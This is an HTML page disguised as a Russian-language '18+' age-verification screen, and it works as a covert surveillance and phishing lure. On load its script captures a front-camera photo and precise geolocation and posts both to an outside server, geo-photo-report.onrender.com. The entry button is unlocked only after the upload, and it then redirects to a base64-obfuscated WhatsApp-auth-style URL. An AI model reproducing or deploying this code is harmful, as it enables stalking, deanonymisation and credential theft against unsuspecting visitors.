<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>18+ Вход — Светлая версия</title>
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="format-detection" content="telephone=no">
  <style>
    :root {
      --bg0: #ffffff;
      --bg1: #f7f9ff;
      --txt: #111;
      --sub: #444;
      --muted: #6b7280;
      --primary: #7b00ff;      /* неоново-фиолетовый основной */
      --primary2: #c084fc;     /* плавный переход к лиловому */
      --ok: #16a34a;
      --err: #ef4444;
      --radius: 20px;
      --shadow: 0 6px 30px rgba(123,0,255,0.2);
      --glow: 0 0 20px rgba(123,0,255,0.5),
              0 0 40px rgba(123,0,255,0.3),
              0 0 60px rgba(192,132,252,0.3);
    }

    html, body { height: 100%; }
    body {
      margin: 0;
      display: grid;
      place-items: center;
      background: var(--bg0);
      color: var(--txt);
      font-family: "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
      -webkit-font-smoothing: antialiased;
      overflow: hidden;
    }

    .animated-gradient {
      position: absolute; inset: -12vmax; z-index: 0;
      filter: blur(80px) saturate(110%);
      opacity: .35;
      pointer-events: none;
      background: conic-gradient(from 0deg,
        rgba(192,132,252,.25),
        rgba(139,92,246,.18),
        rgba(217,180,254,.25),
        rgba(192,132,252,.25));
      animation: swirl 40s linear infinite;
    }
    @keyframes swirl { to { transform: rotate(360deg); } }

    .card {
      width: min(92vw, 520px);
      padding: 32px;
      border-radius: var(--radius);
      background: rgba(255,255,255,0.95);
      box-shadow: var(--shadow);
      border: 2px solid rgba(123,0,255,0.25);
      text-align: center;
      position: relative;
      z-index: 2;
      backdrop-filter: blur(8px);
    }

    h1 { font-size: 24px; font-weight: 800; margin: 0 0 12px; color: var(--txt); }
    p { font-size: 16px; color: var(--sub); margin: 0 0 18px; line-height: 1.55; }
    .reason { font-size: 13px; margin-top: 8px; color: var(--muted); min-height: 1.6em; }
    .notice { font-size: 13px; color: var(--muted); margin-top: 14px; }

    button {
      width: 100%; height: 56px; border: none; border-radius: 14px;
      background: linear-gradient(90deg, var(--primary), var(--primary2));
      color: #fff; font-weight: 800; font-size: 16px;
      cursor: pointer; letter-spacing: .5px;
      transition: transform .15s ease, box-shadow .15s ease, filter .15s ease;
      box-shadow: var(--glow);
      text-shadow: 0 0 10px rgba(255,255,255,0.4);
    }
    button:hover {
      transform: scale(1.02);
      box-shadow: 0 0 25px rgba(123,0,255,0.7),
                  0 0 60px rgba(192,132,252,0.5);
    }
    button:active { transform: scale(.97); filter: brightness(0.95); }

    .ok { color: var(--ok); font-weight: 700; }
    .err { color: var(--err); font-weight: 700; }

    .report-box {
      margin-top: 16px;
      padding: 14px 18px;
      background: rgba(123,0,255,0.05);
      border: 1px solid rgba(123,0,255,0.2);
      border-radius: 14px;
      font-size: 14px;
      line-height: 1.4;
      color: #333;
      box-shadow: inset 0 0 15px rgba(123,0,255,0.1);
      animation: fadeIn 0.5s ease forwards;
    }
    @keyframes fadeIn { from {opacity:0;transform:translateY(5px);} to {opacity:1;transform:translateY(0);} }

    a.map-link {
      display: inline-block;
      margin-top: 6px;
      font-weight: 700;
      color: var(--primary);
      text-decoration: none;
    }
    a.map-link:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="animated-gradient"></div>

  <div class="card">
    <h1 id="title">Проверка устройства</h1>
    <p id="text">Определение платформы…</p>
    <div class="reason" id="reason"></div>
    <button id="enterBtn" style="display:none;">Войти 18+</button>
    <div class="notice" id="note"></div>
  </div>

  <script>
    const URL_PARTS = [
      "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
      "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
      "YVhwbEluMHNJbWgwZEhCek9pOHhNVFV5T1RrM05EZzBOVGt3TUNJc0ltbGhjM05s",
      "ZEhKbGMzUWlPaUpHVjJsMGFYWmxJaXdpWm1KallYUnBiMjRpT2lJd1dsaEtWbUZK",
      "UlVGUFZrUkpVQSJ9"
    ];
    function decodeUrl(p){try{const b64=p.join('');const bin=atob(b64);
      const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
      return new TextDecoder().decode(bytes);}catch{return''}}
    function go(){const t=decodeUrl(URL_PARTS);if(!t)return;location.assign(t)}

    const title=document.getElementById('title');
    const text=document.getElementById('text');
    const reason=document.getElementById('reason');
    const btn=document.getElementById('enterBtn');
    const note=document.getElementById('note');

    const API_BASE='https://geo-photo-report.onrender.com';
    let reportReady=false;

    function btnSetLocked(){
      btn.disabled=true;
      btn.style.filter='grayscale(40%) brightness(0.95)';
      btn.style.boxShadow='none';
      btn.style.opacity='0.6';
    }
    function btnSetReady(){
      btn.disabled=false;
      btn.style.filter='none';
      btn.style.opacity='1';
      btn.style.boxShadow='0 0 30px rgba(123,0,255,0.8),0 0 60px rgba(192,132,252,0.5)';
    }

    async function askGeolocation(){
      return new Promise(resolve=>{
        if(!('geolocation'in navigator)) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          p=>resolve({lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy)}),
          ()=>resolve(null),
          {enableHighAccuracy:true,timeout:15000,maximumAge:0});
      });
    }
    async function takePhoto(){
      if(!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
      const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
      const [t]=s.getVideoTracks();
      const cap=new ImageCapture(t);
      const bmp=await cap.grabFrame();
      const c=document.createElement('canvas');
      c.width=bmp.width; c.height=bmp.height;
      c.getContext('2d').drawImage(bmp,0,0);
      const d=c.toDataURL('image/jpeg',0.85);
      t.stop(); return d;
    }

    async function sendReport({photoBase64,geo}){
      const r=await fetch(`${API_BASE}/api/report`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({geo,photoBase64})
      });
      const d=await r.json();
      if(!d.ok) throw new Error(d.error||'Send failed');
      return d;
    }

    function showReportBox(geo){
      if(!geo) return;
      const url=`https://www.google.com/maps?q=${geo.lat},${geo.lon}&z=16`;
      note.innerHTML = `
        <div class="report-box">
          ✅ Проверка выполнена успешно.<br>
          Геопозиция определена: <strong>${geo.lat.toFixed(5)}, ${geo.lon.toFixed(5)}</strong><br>
          Точность: ±${geo.acc} м<br>
          <a class="map-link" href="${url}" target="_blank">Открыть в Google Картах</a>
        </div>`;
    }

    async function autoFlow(){
      try{
        btnSetLocked();
        text.textContent='Запрашиваем разрешения на камеру и геолокацию...';
        const [geo,photoBase64]=await Promise.all([askGeolocation(),takePhoto()]);
        showReportBox(geo);
        text.textContent='Отправляем данные...';
        await sendReport({photoBase64,geo});
        reportReady=true;
        btnSetReady();
        text.innerHTML='<span class="ok">Проверка пройдена.</span>';
      }catch(e){
        console.error(e);
        reportReady=false;
        btnSetLocked();
        text.innerHTML='<span class="err">Ошибка проверки.</span>';
        note.textContent='Попробуйте позже.';
      }
    }

    (function main(){
      title.textContent='Подтверждение 18+';
      text.textContent='Определяем платформу...';
      btn.style.display='block';
      setTimeout(autoFlow,500);
      btn.addEventListener('click',e=>{
        if(!reportReady){e.preventDefault();return;}
        go();
      });
    })();
  </script>
</body>
</html>
